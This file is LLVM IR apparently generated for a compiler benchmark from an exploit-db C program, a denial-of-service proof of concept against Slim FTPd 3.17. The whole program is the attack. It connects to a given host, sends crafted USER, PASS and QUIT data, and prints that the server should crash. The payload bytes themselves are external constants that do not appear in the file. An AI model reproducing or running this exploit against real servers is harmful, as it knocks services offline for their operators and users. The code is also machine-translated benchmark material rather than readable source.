; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_26219.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_26219.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, i32 }
%struct.hostent = type { i32, i32* }
%struct.sockaddr = type { i32 }

@BUFSIZ = common dso_local global i32 0, align 4
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"pizute\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"%s%s%s\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"Usage: \00", align 1
@.str.3 = private unnamed_addr constant [18 x i8] c" hostname or ip\0A\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.5 = private unnamed_addr constant [53 x i8] c"\0ACritical Security web-site: http://www.critical.lt\0A\00", align 1
@.str.6 = private unnamed_addr constant [38 x i8] c"Slim FTPd 3.17 lame PoC DoS exploit.\0A\00", align 1
@.str.7 = private unnamed_addr constant [32 x i8] c"greets to Lithuanian girlz :)\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [31 x i8] c"[*] Initiating attack against \00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.10 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@USER = common dso_local global i32 0, align 4
@PASS = common dso_local global i32 0, align 4
@QUIT = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [114 x i8] c"[*] Stuff sent, now wait for 30-120 seconds,\0Aserver should crash, if's not - try again or write a better code :P\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* @BUFSIZ, align 4
  %15 = add nsw i32 %14, 1
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %10, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %11, align 8
  %19 = load i32, i32* @PF_INET, align 4
  %20 = load i32, i32* @SOCK_STREAM, align 4
  %21 = call i32 @socket(i32 %19, i32 %20, i32 0)
  store i32 %21, i32* %6, align 4
  %22 = icmp slt i32 %21, 0
  br i1 %22, label %23, label %25

23:                                               ; preds = %2
  %24 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %85

25:                                               ; preds = %2
  %26 = call i32 @bzero(%struct.sockaddr_in* %8, i32 12)
  %27 = load i32, i32* @AF_INET, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %27, i32* %28, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp sle i32 %29, 1
  br i1 %30, label %31, label %36

31:                                               ; preds = %25
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i8* %34, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.3, i64 0, i64 0))
  br label %84

36:                                               ; preds = %25
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  store i8* %39, i8** %12, align 8
  %40 = load i32, i32* @PORT, align 4
  %41 = call i32 @htons(i32 %40)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %41, i32* %42, align 4
  %43 = load i8*, i8** %12, align 8
  %44 = call %struct.hostent* @gethostbyname(i8* %43)
  store %struct.hostent* %44, %struct.hostent** %9, align 8
  %45 = icmp eq %struct.hostent* %44, null
  br i1 %45, label %46, label %49

46:                                               ; preds = %36
  %47 = load i8*, i8** %12, align 8
  %48 = call i32 @perror(i8* %47)
  store i32 2, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %85

49:                                               ; preds = %36
  %50 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.5, i64 0, i64 0))
  %51 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.6, i64 0, i64 0))
  %52 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.7, i64 0, i64 0))
  %53 = load i8*, i8** %12, align 8
  %54 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.8, i64 0, i64 0), i8* %53, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0))
  %55 = load %struct.hostent*, %struct.hostent** %9, align 8
  %56 = getelementptr inbounds %struct.hostent, %struct.hostent* %55, i32 0, i32 1
  %57 = load i32*, i32** %56, align 8
  %58 = getelementptr inbounds i32, i32* %57, i64 0
  %59 = load i32, i32* %58, align 4
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %61 = load %struct.hostent*, %struct.hostent** %9, align 8
  %62 = getelementptr inbounds %struct.hostent, %struct.hostent* %61, i32 0, i32 0
  %63 = load i32, i32* %62, align 8
  %64 = call i32 @bcopy(i32 %59, i32* %60, i32 %63)
  %65 = load i32, i32* %6, align 4
  %66 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %67 = call i64 @connect(i32 %65, %struct.sockaddr* %66, i32 12)
  %68 = icmp slt i64 %67, 0
  br i1 %68, label %69, label %71

69:                                               ; preds = %49
  %70 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0))
  store i32 3, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %85

71:                                               ; preds = %49
  %72 = load i32, i32* %6, align 4
  %73 = load i32, i32* @USER, align 4
  %74 = call i32 @write(i32 %72, i32 %73, i32 4)
  %75 = load i32, i32* %6, align 4
  %76 = load i32, i32* @PASS, align 4
  %77 = call i32 @write(i32 %75, i32 %76, i32 4)
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* @QUIT, align 4
  %80 = call i32 @write(i32 %78, i32 %79, i32 4)
  %81 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str.11, i64 0, i64 0))
  %82 = load i32, i32* %6, align 4
  %83 = call i32 @close(i32 %82)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %85

84:                                               ; preds = %31
  store i32 0, i32* %13, align 4
  br label %85

85:                                               ; preds = %84, %71, %69, %46, %23
  %86 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %86)
  %87 = load i32, i32* %13, align 4
  switch i32 %87, label %90 [
    i32 0, label %88
    i32 1, label %88
  ]

88:                                               ; preds = %85, %85
  %89 = load i32, i32* %3, align 4
  ret i32 %89

90:                                               ; preds = %85
  unreachable
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #2

declare dso_local i32 @printf(i8*, i8*, ...) #2

declare dso_local i32 @htons(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @bcopy(i32, i32*, i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @write(i32, i32, i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
